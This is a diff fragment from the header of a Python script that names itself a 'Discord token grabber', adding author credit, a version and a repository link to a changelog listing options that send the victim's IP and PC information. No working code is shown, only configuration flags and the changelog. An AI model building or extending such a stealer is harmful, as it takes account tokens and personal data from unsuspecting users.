@@ -15,12 +15,19 @@ MODE = 'TEXT'
 EXPERIMENTAL= False
 
 '''
+Discord token grabber
+Made by Mega145 aka MegaDev
+v1.0
+https://github.com/mega145/Discord_token_grabber
+
+
 CHANGELOG:
 - added SEND_IP and SEND_PC_INFO options
 - added EMBED to MODE (not ready to use yet)
 - added EXPERIMANTAL bool
 - added getIP() function
 - added getUserInfo() function
+- updated README
 '''
 
 
